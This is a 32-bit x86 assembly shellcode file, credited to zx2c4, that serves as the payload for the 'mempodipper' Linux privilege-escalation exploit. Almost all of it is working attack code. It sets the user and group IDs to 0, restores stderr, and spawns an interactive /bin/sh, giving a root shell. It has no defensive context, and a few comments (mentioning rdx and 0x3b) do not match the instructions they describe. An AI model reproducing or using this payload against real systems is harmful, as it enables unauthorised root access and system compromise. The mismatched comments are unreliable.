BITS 32
; This shell code sets uid and gid to 0 and execs a shell in interactive mode.
; It also reopens stderr that was previously saved inside fd 6, for use with mempodipper.
;
; by zx2c4


;setuid(0)
xor ebx,ebx
mov al,0x17
int 0x80
;setgid(0)
xor ebx,ebx
mov al,0x2e
int 0x80
;dup2(15, 2)
xor ecx,ecx
mov bl,0xf
mov cl,0x2
mov al,0x3f
int 0x80



; execve("//bin/sh", ["//bin/sh", "-i", 0], 0)
xor eax,eax			; eax = 0
push eax			; push eax
push 0x68732f6e			; push //bin/sh
push 0x69622f2f
mov ebx,esp			; set ebx (arg 1) to top of stack

xor edx,edx			; edx = 0
mov dx,'-i'			; edx = '-i'
push edx			; push edx to stack
mov eax,esp			; set eax to top of stack

xor edx,edx			; edx = 0

; so at this point:
;	ebx is a pointer to '//bin/sh'
;	eax is a pointer to '-i'
;	edx is null
; since they are all the same size, we'll push them on the stack
; and then it will be an array:
push edx			; push edx to stack
push eax			; push eax to stack
push ebx			; push ebx to stack
mov ecx,esp			; set ecx (arg 2) to top of stack

xor edx,edx			; rdx (arg 3) = 0

xor eax,eax
mov al,0xb			; al = 0x3b, which is the exec call
int 0x80
